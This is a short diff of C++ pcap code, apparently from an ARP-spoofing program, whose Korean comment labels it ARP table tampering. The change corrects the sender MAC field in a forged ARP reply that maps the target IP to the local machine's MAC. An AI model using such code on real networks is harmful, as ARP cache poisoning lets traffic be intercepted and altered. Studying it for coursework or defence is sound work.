@@ -147,12 +147,12 @@ int main(int argc, char* argv[]) {
     	pcap_loop(handle, -1, arp_reply_handler, (u_char*)&data);
 
 		// ARP table 변조
-		packet.eth_.dmac_ = Mac(sender_mac);
+		packet.eth_.dmac_ = Mac(data.sender_mac);
 		packet.eth_.smac_ = Mac(addresses->macAddress);
 		packet.arp_.op_ = htons(ArpHdr::Reply);
 		packet.arp_.smac_ = Mac(addresses->macAddress);
 		packet.arp_.sip_ = htonl(Ip(target_ip));
-		packet.arp_.tmac_ = Mac(sender_mac);
+		packet.arp_.tmac_ = Mac(data.sender_mac);
 		packet.arp_.tip_ = htonl(Ip(sender_ip));
 
 		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
